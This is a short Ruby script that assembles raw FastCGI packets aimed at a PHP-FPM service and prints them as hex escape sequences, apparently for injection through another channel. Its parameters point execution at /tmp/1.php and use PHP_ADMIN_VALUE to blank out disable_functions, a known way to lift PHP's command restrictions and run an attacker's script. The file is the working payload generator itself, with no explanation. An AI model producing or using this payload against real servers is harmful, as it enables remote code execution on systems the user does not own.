#!/usr/bin/ruby


class FCGIRecord

  class BeginRequest < FCGIRecord
    def initialize( id)
      @id = id
      @type = 1
      @data = "\x00\x01\x00\x00\x00\x00\x00\x00"
    end
  end

  class Params < FCGIRecord
    def initialize( id, params = {})
      @id = id
      @type = 4
      @data = ""
      params.each do |k,v|
        @data << "%c%c%s%s" % [ k.to_s.length, v.to_s.length, k.to_s, v.to_s ]
      end
    end
  end


  def initialize( id, type)
    @id = id
    @type = type
    @data = ""
  end

  def to_s
    packet = "\x01%c%c%c%c%c%c\x00" % [
      type,
      id / 256, id % 256,
      data.length / 256, data.length % 256,
      data.length % 8
    ]
    packet << data
    packet << "\x00" * (data.length % 8)
  end

  private
  attr_reader :id, :type, :data
end


packet = ""
packet << FCGIRecord::BeginRequest.new( 1).to_s
packet << FCGIRecord::Params.new( 1, 
#                                  "SERVER_NAME" => "test19.",
                                  "REQUEST_METHOD" => "GET",
                                  "SCRIPT_FILENAME" => "/tmp/1.php",
                                  "PHP_ADMIN_VALUE" => "disable_functions=\"\""
                                  ).to_s
packet << FCGIRecord::Params.new( 1).to_s
packet << FCGIRecord.new( 1, 5).to_s


print packet.split('').map{ |c| '\x%02x' % c[0].ord }.join
